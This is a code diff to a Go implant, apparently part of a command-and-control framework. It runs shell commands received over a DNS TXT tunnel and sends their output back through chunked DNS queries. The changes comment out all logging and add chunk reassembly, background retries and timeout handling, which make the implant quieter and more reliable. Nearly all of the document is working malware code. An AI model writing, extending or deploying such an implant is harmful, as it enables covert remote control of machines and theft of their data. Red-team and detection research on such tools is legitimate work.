@@ -3,7 +3,7 @@ package main
 import (
 	"encoding/base64"
 	"fmt"
-	"log"
+	//"log"
 	"strings"
 	"time"
 	"encoding/json"
@@ -12,6 +12,7 @@ import (
 	"runtime"
 	"os"
 	"os/exec"
+	"context"
 	"github.com/mattn/go-shellwords"
 	"github.com/miekg/dns"
 )
@@ -30,6 +31,19 @@ type lupoImplant struct {
 	data           string
 	pendingFileName    string
 	pendingFileContent string
+	lastRespTime       time.Time    // Track when last valid response was received
+	invalidRespCount   int          // Count consecutive invalid responses
+	lastValidResp      string       // Cache last valid response for retry
+	failedChunks       map[int]bool // Track which response chunks failed
+	failedChunkData    map[int]string // Store partial/failed response chunks
+	chunkReassemblyStart time.Time   // Track when chunk reassembly begins
+	chunkReassemblyTimeout time.Duration // Max time to spend reassembling chunks
+	lastProgressLog    int // Last chunk index where we logged progress
+	transferRetryCount int // Track retry attempts (0-50)
+	transferTotalChunks int // Store total chunks for retry logic
+	transferInProgress bool // Whether transfer is currently being retried
+	backgroundTransferActive bool // Whether background transfer goroutine is running
+	transferCompletedData string // Data returned from successful background transfer
 }
 
 var implant *lupoImplant
@@ -41,12 +55,21 @@ func main() {
 		updateInterval: 1,
 		protocol:       "DNS",
 		dns_domain:     "example.com.",
-		rhost:          "192.168.3.227",
-		rport:          1337,
+		rhost:          "127.0.0.1",
+		rport:          5333,
 		id:             -1,
 		uuid:           "",
 		psk:            "wolfpack",
 		data:           "",
+		failedChunks:   make(map[int]bool),
+		failedChunkData: make(map[int]string),
+		chunkReassemblyTimeout: 5 * time.Minute, // Max 5 minutes to reassemble chunks
+		lastProgressLog: 0,
+		transferRetryCount: 0,
+		transferTotalChunks: 0,
+		transferInProgress: false,
+		backgroundTransferActive: false,
+		transferCompletedData: "",
 	}
 
 	for {
@@ -67,30 +90,30 @@ func ExecLoop(implant *lupoImplant) {
 			"functions": buildCustomFunctions(),
 		}
 
-		fmt.Println(regMsg)
+		//fmt.Println(regMsg)
 
 		jsonMsg, err := json.Marshal(regMsg)
 		if err != nil {
-			log.Printf("Failed to marshal registration: %v", err)
+			//log.Printf("Failed to marshal registration: %v", err)
 			return
 		}
 
-		fmt.Println(string(jsonMsg))
+		//fmt.Println(string(jsonMsg))
 
 		resp, err := sendDNSMessage(implant, string(jsonMsg))
 		if err != nil {
-			log.Printf("Failed to send registration: %v", err)
+			//log.Printf("Failed to send registration: %v", err)
 			return
 		}
 
-		fmt.Println("Response: ", resp)
+		//fmt.Println("Response: ", resp)
 
 		// Parse registration response (server returns plain JSON in TXT)
 		if resp != "" {
 			serverResp, err := parseResponse(resp)
 			if err != nil {
-				log.Printf("Failed to parse response: %v", err)
-				log.Printf("Raw response was: %s", resp)
+				//log.Printf("Failed to parse response: %v", err)
+				//log.Printf("Raw response was: %s", resp)
 				return
 			}
 
@@ -104,7 +127,7 @@ func ExecLoop(implant *lupoImplant) {
 					}
 				}
 			} else {
-				log.Printf("Registration response missing sessionID, raw: %v", serverResp)
+				//log.Printf("Registration response missing sessionID, raw: %v", serverResp)
 				return
 			}
 
@@ -144,30 +167,111 @@ func ExecLoop(implant *lupoImplant) {
 
 	jsonMsg, err := json.Marshal(checkInMsg)
 	if err != nil {
-		log.Printf("Failed to marshal check-in: %v", err)
+		//log.Printf("Failed to marshal check-in: %v", err)
 		return
 	}
 
 	resp, err := sendDNSMessage(implant, string(jsonMsg))
 	if err != nil {
-		log.Printf("Failed to send check-in: %v", err)
+		//log.Printf("Failed to send check-in: %v", err)
+		return
+	}
+
+	// Check if background transfer completed successfully
+	if implant.transferCompletedData != "" {
+		//log.Printf("Background transfer completed successfully, using reassembled data")
+		resp = implant.transferCompletedData
+		implant.transferCompletedData = ""
+		implant.transferInProgress = false
+		implant.transferRetryCount = 0
+	}
+
+	// If we have a pending transfer retry, check if this is a new response attempt
+	if implant.transferInProgress && implant.transferRetryCount > 0 && resp == "" {
+		// Background goroutine is handling this, don't start another one
+		//log.Printf("Transfer still pending, background retry in progress (attempt %d/50). Will continue on next check-in", implant.transferRetryCount)
+		return
+	}
+
+	// If this check-in returned no response but we had a pending transfer, start background retry
+	if implant.transferInProgress && resp == "" && !implant.backgroundTransferActive {
+		//log.Printf("Starting background retry for incomplete transfer (attempt %d/50)...", implant.transferRetryCount)
+		implant.backgroundTransferActive = true
+		go backgroundTransferRetry(implant)
 		return
 	}
 
 	// Handle server command
-	if resp != "" {
+	// Keep retrying DNS queries if we only got ACKs (server still assembling response)
+	maxRetries := 10
+	retryCount := 0
+	for retryCount < maxRetries && resp == "chunk received" {
+		//log.Printf("Received chunk ACK, waiting for response (attempt %d/%d)", retryCount+1, maxRetries)
+		time.Sleep(200 * time.Millisecond)
+		
+		// Send a proper check-in message with PSK during retries
+		retryMsg := map[string]interface{}{
+			"psk":       implant.psk,
+			"sessionID": implant.id,
+			"UUID":      implant.uuid,
+			"data":      "",
+			"register":  false,
+		}
+		jsonBytes, _ := json.Marshal(retryMsg)
+		
+		var err error
+		resp, err = sendDNSMessage(implant, string(jsonBytes))
+		if err != nil {
+			//log.Printf("Retry query failed: %v", err)
+			break
+		}
+		retryCount++
+	}
+	
+	if resp != "" && resp != "chunk received" {
+		
+		// Validate base64 before decoding
+		if !isValidBase64(resp) {
+			//log.Printf("Invalid base64 data received (attempt %d), skipping: %s...", implant.invalidRespCount+1, resp[:min(len(resp), 50)])
+			implant.invalidRespCount++
+			
+			// After 3 consecutive invalid responses, reset and move on
+			if implant.invalidRespCount >= 3 {
+				//log.Printf("Too many invalid responses, resetting state")
+				implant.lastValidResp = ""
+				implant.invalidRespCount = 0
+			}
+			return
+		}
+		
+		// Reset invalid response counter on valid base64
+		implant.invalidRespCount = 0
+		implant.lastValidResp = resp
+		implant.lastRespTime = time.Now()
+		
 		decodedResp, err := base64.RawURLEncoding.DecodeString(resp)
 		if err != nil {
-			log.Printf("base64 decode failed: %v", err)
+			//log.Printf("base64 decode failed: %v (data length: %d), may need chunk retransmission", err, len(resp))
+			implant.invalidRespCount++
+			if implant.invalidRespCount >= 3 {
+				//log.Printf("Chunk transmission failed 3 times, clearing buffer and moving to next cycle")
+				implant.lastValidResp = ""
+				implant.invalidRespCount = 0
+			}
 			return
 		}
 		resp = string(decodedResp)
-		fmt.Println("Decoded response: ", resp)
+		//fmt.Println("Decoded response: ", resp)
 		
 		var cmdResp map[string]interface{}
 		if err := json.Unmarshal([]byte(resp), &cmdResp); err != nil {
-			log.Printf("Failed to parse command: %v", err)
-			log.Printf("Raw response was: %s", resp)
+			//log.Printf("Failed to parse command: %v", err)
+			//log.Printf("Raw response was: %s", resp)
+			implant.invalidRespCount++
+			if implant.invalidRespCount >= 3 {
+				implant.lastValidResp = ""
+				implant.invalidRespCount = 0
+			}
 			return
 		}
 
@@ -186,6 +290,7 @@ func ExecLoop(implant *lupoImplant) {
 			if ustr, ok := uuidVal.(string); ok {
 				implant.uuid = ustr
 			}
+			implant.invalidRespCount = 0
 			return
 		}
 
@@ -194,7 +299,7 @@ func ExecLoop(implant *lupoImplant) {
 			// Parse command into parts
 			parsedCmd, err := shellwords.Parse(cmd)
 			if err != nil || len(parsedCmd) == 0 {
-				log.Printf("Failed to parse command string: %v", err)
+				//log.Printf("Failed to parse command string: %v", err)
 				return
 			}
 
@@ -243,9 +348,11 @@ func ExecLoop(implant *lupoImplant) {
 				output := executeCommand(strings.Join(parsedCmd, " "))
 				implant.data = output
 			}
-			}
+			// Successfully processed command - reset error counter
+			implant.invalidRespCount = 0
 		}
 	}
+}
 }
 
 // parseResponse tries to unmarshal a TXT reply that may be raw JSON, a quoted
@@ -253,13 +360,17 @@ func ExecLoop(implant *lupoImplant) {
 // success.
 func parseResponse(resp string) (map[string]interface{}, error) {
 
+	// Validate base64 before attempting decode
+	if !isValidBase64(resp) {
+		return nil, fmt.Errorf("invalid base64 data at input (first 50 chars: %s)", resp[:min(len(resp), 50)])
+	}
 
 	decodedResp, err := base64.RawURLEncoding.DecodeString(resp)
 	if err != nil {
-		return nil, fmt.Errorf("base64 decode failed: %v", err)
+		return nil, fmt.Errorf("base64 decode failed: %v (data length: %d)", err, len(resp))
 	}
 	resp = string(decodedResp)
-	fmt.Println("Decoded response: ", resp)
+	//fmt.Println("Decoded response: ", resp)
 	var m map[string]interface{}
 	if err := json.Unmarshal([]byte(resp), &m); err == nil {
 		return m, nil
@@ -336,11 +447,159 @@ func executeCommand(cmd string) string {
 	return string(out)
 }
 
+// backgroundTransferRetry continuously retries fetching missing chunks in a background goroutine
+// It times out after 5 minutes of no responses
+func backgroundTransferRetry(implant *lupoImplant) {
+	defer func() {
+		implant.backgroundTransferActive = false
+	}()
+
+	connectionString := fmt.Sprintf("%s:%d", implant.rhost, implant.rport)
+	lastChunkReceivedTime := time.Now()
+	//retryAttempt := implant.transferRetryCount
+
+	//log.Printf("Background transfer retry started (attempt %d/50)", retryAttempt)
+
+	for {
+		// Check 5-minute inactivity timeout
+		timeSinceLastChunk := time.Since(lastChunkReceivedTime)
+		if timeSinceLastChunk > 5*time.Minute {
+			//log.Printf("Background transfer timeout: No chunks received for 5 minutes. Aborting.")
+			implant.data = fmt.Sprintf("upload: failed to download file - 5 minute timeout with no responses")
+			implant.transferInProgress = false
+			implant.transferRetryCount = 0
+			return
+		}
+
+		// Get list of missing chunks
+		missingChunks := make([]int, 0)
+		for i := 1; i < implant.transferTotalChunks; i++ {
+			if _, isFailed := implant.failedChunks[i]; isFailed {
+				if _, exists := implant.failedChunkData[i]; !exists {
+					missingChunks = append(missingChunks, i)
+				}
+			}
+		}
+
+		// If no missing chunks reported, try fetching all chunks (in case server re-sent response)
+		if len(missingChunks) == 0 {
+			for i := 1; i < implant.transferTotalChunks; i++ {
+				if _, exists := implant.failedChunkData[i]; !exists {
+					missingChunks = append(missingChunks, i)
+				}
+			}
+		}
+
+		if len(missingChunks) == 0 {
+			// All chunks received!
+			//log.Printf("Background transfer complete! All chunks received.")
+			reassembledResp := ""
+			for i := 0; i < implant.transferTotalChunks; i++ {
+				if data, ok := implant.failedChunkData[i]; ok {
+					reassembledResp += data
+				}
+			}
+			implant.transferCompletedData = reassembledResp
+			implant.transferInProgress = false
+			implant.transferRetryCount = 0
+			return
+		}
+
+		// Try to fetch one batch of missing chunks
+		chunksFetched := 0
+		for _, chunkIdx := range missingChunks {
+			if chunksFetched >= 5 {
+				break // Fetch max 5 chunks per iteration to avoid hammering
+			}
+
+			getchunkLabel := fmt.Sprintf("getchunk-%d-%d", implant.id, chunkIdx)
+			getchunkFqdn := fmt.Sprintf("%s.%s", getchunkLabel, implant.dns_domain)
+
+			chunkMsg := new(dns.Msg)
+			chunkMsg.SetQuestion(getchunkFqdn, dns.TypeTXT)
+			chunkMsg.RecursionDesired = false
+
+			c := new(dns.Client)
+			c.Timeout = 10 * time.Second
+
+			chunkCtx, cancel := context.WithTimeout(context.Background(), 12*time.Second)
+			chunkResp, _, err := c.ExchangeContext(chunkCtx, chunkMsg, connectionString)
+			cancel()
+
+			if err == nil && chunkResp != nil && len(chunkResp.Answer) > 0 {
+				if txt, ok := chunkResp.Answer[0].(*dns.TXT); ok {
+					chunkData := strings.Join(txt.Txt, "")
+					chunkParts := strings.SplitN(chunkData, "-", 3)
+					if len(chunkParts) == 3 {
+						implant.failedChunkData[chunkIdx] = chunkParts[2]
+						delete(implant.failedChunks, chunkIdx)
+						chunksFetched++
+						lastChunkReceivedTime = time.Now() // Reset inactivity timer
+						//log.Printf("Background transfer: Successfully fetched chunk %d/%d", chunkIdx, implant.transferTotalChunks-1)
+					}
+				}
+			} else {
+				//log.Printf("Background transfer: Failed to fetch chunk %d, will retry", chunkIdx)
+			}
+
+			time.Sleep(50 * time.Millisecond)
+		}
+
+		// Sleep before next retry iteration
+		time.Sleep(500 * time.Millisecond)
+	}
+}
+
+// reassembleChunks handles the chunked response reassembly logic
+// It fetches all chunks and reassembles them into the complete response
+func reassembleChunks(implant *lupoImplant, firstChunkResp string, connectionString string) string {
+	parts := strings.SplitN(firstChunkResp, "-", 3)
+	if len(parts) != 3 {
+		return ""
+	}
+
+	totalRespChunks, _ := strconv.Atoi(parts[0])
+	chunkIndex, _ := strconv.Atoi(parts[1])
+	
+	if totalRespChunks <= 1 || chunkIndex != 0 {
+		return "" // Not a multi-chunk response
+	}
+
+	// Start reassembly
+	implant.chunkReassemblyStart = time.Now()
+	implant.lastProgressLog = 0
+
+	// If this is a new transfer (not a retry), initialize retry counter
+	if !implant.transferInProgress {
+		implant.transferRetryCount = 1
+		implant.transferTotalChunks = totalRespChunks
+		implant.transferInProgress = true
+		implant.failedChunks = make(map[int]bool)
+		implant.failedChunkData = make(map[int]string)
+		//log.Printf("Detected chunked response: %d chunks total. Starting background download thread.", totalRespChunks)
+	} else {
+		// Already in progress, just update retry count
+		implant.transferRetryCount++
+		//log.Printf("Background thread detected new response for same transfer (retry attempt %d)", implant.transferRetryCount)
+	}
+
+	implant.failedChunkData[0] = parts[2] // Store first chunk
+
+	// Start background thread if not already running
+	if !implant.backgroundTransferActive {
+		implant.backgroundTransferActive = true
+		go backgroundTransferRetry(implant)
+	}
+
+	// Return empty - let the background thread handle all the downloading
+	return ""
+}
+
 func sendDNSMessage(implant *lupoImplant, message string) (string, error) {
 	// Encode the whole JSON message using RawURLEncoding (no padding), then chunk it
 	encodedMsg := base64.RawURLEncoding.EncodeToString([]byte(message))
 
-	fmt.Println(encodedMsg)
+	//fmt.Println(encodedMsg)
 
 	const maxChunkSize = 40
 	chunks := make([]string, 0)
@@ -369,11 +628,28 @@ func sendDNSMessage(implant *lupoImplant, message string) (string, error) {
 		msg.SetQuestion(fqdn, dns.TypeTXT)
 		msg.RecursionDesired = false
 
-		c := new(dns.Client)
-		c.Timeout = 5 * time.Second
-		resp, _, err := c.Exchange(msg, connectionString)
-		if err != nil {
-			return "", fmt.Errorf("DNS query failed: %v", err)
+		// Retry logic for timeouts
+		maxRetries := 3
+		var resp *dns.Msg
+		var err error
+		
+		for retryCount := 0; retryCount <= maxRetries; retryCount++ {
+			c := new(dns.Client)
+			c.Timeout = 10 * time.Second
+			resp, _, err = c.Exchange(msg, connectionString)
+			
+			if err == nil {
+				// Success, break out of retry loop
+				break
+			}
+			
+			if retryCount < maxRetries {
+				//log.Printf("DNS query timeout for chunk %d/%d, retrying (%d/%d)...", i+1, totalChunks, retryCount+1, maxRetries)
+				time.Sleep(250 * time.Millisecond)
+			} else {
+				// Failed after all retries
+				return "", fmt.Errorf("DNS query failed after %d retries for chunk %d/%d: %v", maxRetries, i+1, totalChunks, err)
+			}
 		}
 
 		// Process server response: server returns plain JSON in TXT for non-ack responses
@@ -381,15 +657,34 @@ func sendDNSMessage(implant *lupoImplant, message string) (string, error) {
 			if txt, ok := resp.Answer[0].(*dns.TXT); ok {
 				serverResp = strings.Join(txt.Txt, "")
 				if serverResp != "chunk received" {
-					// Expect plain JSON
+					// Expect plain JSON or chunked response
 					break
 				}
 			}
 		}
 
-		fmt.Println(fqdn)
+		//fmt.Println(fqdn)
 
-		time.Sleep(100 * time.Millisecond)
+		time.Sleep(25 * time.Millisecond)
+	}
+
+	// Check if response is a chunked response from server (format: totalChunks-chunkIndex-chunkData)
+	if serverResp != "" && strings.Count(serverResp, "-") >= 2 {
+		parts := strings.SplitN(serverResp, "-", 3)
+		if len(parts) == 3 {
+			totalRespChunks, _ := strconv.Atoi(parts[0])
+			chunkIndex, _ := strconv.Atoi(parts[1])
+			if totalRespChunks > 1 && chunkIndex == 0 {
+				// This is a chunked response from server, use reassembly helper
+				reassembledResp := reassembleChunks(implant, serverResp, connectionString)
+				if reassembledResp != "" {
+					serverResp = reassembledResp
+				} else {
+					// Reassembly in progress or failed, return empty
+					return "", nil
+				}
+			}
+		}
 	}
 
 	return serverResp, nil
@@ -480,3 +775,29 @@ func chunkString(data string, maxPayload int) []string {
 	return chunks
 }
 
+
+// isValidBase64 checks if a string is valid base64 (no padding in RawURLEncoding)
+func isValidBase64(s string) bool {
+	if len(s) == 0 {
+		return false
+	}
+	
+	// RawURLEncoding doesn't use padding, but all chars should be valid
+	for _, c := range s {
+		if !((c >= 'a' && c <= 'z') ||
+			(c >= 'A' && c <= 'Z') ||
+			(c >= '0' && c <= '9') ||
+			c == '-' || c == '_') {
+			return false
+		}
+	}
+	return true
+}
+
+// min returns the minimum of two integers
+func min(a, b int) int {
+	if a < b {
+		return a
+	}
+	return b
+}
